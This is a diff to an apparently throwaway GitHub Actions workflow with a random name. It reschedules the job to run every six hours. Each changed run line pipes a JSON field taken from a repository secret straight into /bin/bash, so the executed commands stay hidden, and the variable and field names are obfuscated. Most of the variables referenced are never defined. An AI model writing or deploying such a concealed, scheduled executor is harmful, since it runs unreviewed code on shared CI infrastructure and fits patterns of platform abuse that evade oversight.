@@ -3,20 +3,25 @@ name: hanguofu6751
 on:
   workflow_dispatch:
   schedule:
-    - cron: '3 4/6 * * *'
-jobs:  # 18984
+    - cron: '36 2/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: hanguofu6751
         env:
-          t163: ${{ secrets.t163 }}
+          tcbr7: ${{ secrets.tcbr7 }}
         run: |
-          echo $t163 | jq -r .oj07090 | /bin/bash
-          echo $mb5241 | jq -r .w53 | /bin/bash
-          echo $dxx329 | jq -r .ab1531 | /bin/bash
-          echo $syrs5488 | jq -r .ez87 | /bin/bash
-          echo $pslk000 | jq -r .rllix1248 | /bin/bash
-          echo $mhdn26927 | jq -r .ksgbc52 | /bin/bash
+          echo $tcbr7 | jq -r .eb918 | /bin/bash
+          echo $wl39 | jq -r .kmvp309 | /bin/bash
+          echo $dbezl0 | jq -r .trl54020 | /bin/bash
+          echo $xfeek989 | jq -r .ybw5883 | /bin/bash
+          echo $ye01 | jq -r .lggha5108 | /bin/bash
+          echo $fkzze58 | jq -r .axsoj608 | /bin/bash
+          echo $vbmc39222 | jq -r .rx2979 | /bin/bash
+          echo $lu8 | jq -r .jt19 | /bin/bash
+          echo $cfj1016 | jq -r .gzykr690 | /bin/bash
 
